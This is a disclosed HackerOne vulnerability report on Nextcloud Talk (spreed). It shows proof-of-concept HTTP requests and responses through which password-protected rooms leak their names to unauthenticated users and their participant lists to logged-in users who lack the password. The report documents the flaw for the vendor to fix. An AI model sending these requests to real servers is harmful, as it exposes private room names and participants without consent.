# Talk / spreed: Disclosure of Room names and participants for password protected rooms

## Report Details
- **Report ID**: 428010
- **URL**: https://hackerone.com/reports/428010
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-10-24T14:31:02.225Z
- **Disclosed**: 2019-04-17T14:22:58.001Z

## Reporter
- **Username**: foobar7
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
CVSS
----

5.3 Medium [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) (CVSS isn't always as fine-grained as I'd like; personally, I would rate the issue somewhere between low and medium)

Description
-----------

The API of the official [spreed/talk](https://github.com/nextcloud/spreed) extension reveals potentially sensitive information such as room names or participants of password-protected rooms to users without the password.

An account is not required to access room names.

POC: Shared, password protected room leaks room name to unauthenticated attackers
---------

Prerequisite: Create a room, click on "Share link", and enable password protection.

As unauthenticated user, visit the login page to get cookies and a CSRF token. 

The unauthenticated user cannot access `nextcloud/nextcloud/ocs/v2.php/apps/spreed/api/v1/room` or `nextcloud/nextcloud/ocs/v2.php/apps/spreed/api/v1/room/iu86mvxv/participant` ("Current user is not logged in"). However, they can access specific rooms based on the room id:

    GET /nextcloud/nextcloud/ocs/v2.php/apps/spreed/api/v1/room/bk9we2vg HTTP/1.1
    Host: 192.168.0.103
    [...]
    requesttoken: [...]
    [...]
    Cookie: [...]
    Connection: close

    HTTP/1.1 200 OK
    {"ocs":{"meta":{"status":"ok","statuscode":200,"message":"OK"},"data":{"id":13,"token":"bk9we2vg","type":3,"name":"supersecret","displayName":"supersecret","objectType":"","objectId":"","participantType":4,"participantInCall":0,"participantFlags":0,"count":1,"hasPassword":true,"hasCall":false,"lastActivity":1540389616,"unreadMessages":0,"unreadMention":false,"isFavorite":false,"lastPing":0,"sessionId":"0","participants":[],"numGuests":0,"guestList":"","lastMessage":[]}}}

Despite being password protected, the room leaked the room name - which might contain sensitive information - to unauthenticated attackers.

POC: Shared, password protected room leaks participans to authenticated attackers
--------------------

Prerequisite: Create a room, click on "Share link", and enable password protection.

As an authenticated user, issue the following request:

    GET /nextcloud/nextcloud/ocs/v2.php/apps/spreed/api/v1/room/bk9we2vg/participants HTTP/1.1
    Host: 192.168.0.103
    [...]
    requesttoken: [...]
    [...]
    Cookie: [...]
    Connection: close

    HTTP/1.1 200 OK
    {"ocs":{"meta":{"status":"ok","statuscode":200,"message":"OK"},"data":[{"inCall":0,"lastPing":1540389861,"sessionId":"hnHuuwybsX6r65fbWFpwqvjZ+R15kumbONTr+ynIO5yu6TpDdPzDXov6+l3H2PkKX7X9FIC4BqAHBoZ\/Ath\/Fqjg9ljuj7smGUyf\/1Z8B\/yw9kotgZd4rM00OOaB2s+8Lph5zizgp7PoHiCvKTw2azAFIWBhLSe9fXQ9sdxzSMYSLAoYCaObU394OQO3ITJVjDQZQ1VOUSx+7dDPI1ycIZVTR\/tOSXg7tfHCigOvetJkRxURCD3V80rdRR2n9IK","participantType":1,"userId":"admin","displayName":"admin"}]}}

Despite being password protected, the room leaked the participant list to an authenticated attacker. From what I can tell, `sessionId` should not leak either, but isn't useful for an attacker.

Solution
--------

The information should only be displayed to users that have authenticated themselves with the correct password for the room.

## Impact

Disclosure of Room names and participants for password protected rooms to unauthenticated or authenticated users without password.

## Attachments
No attachments
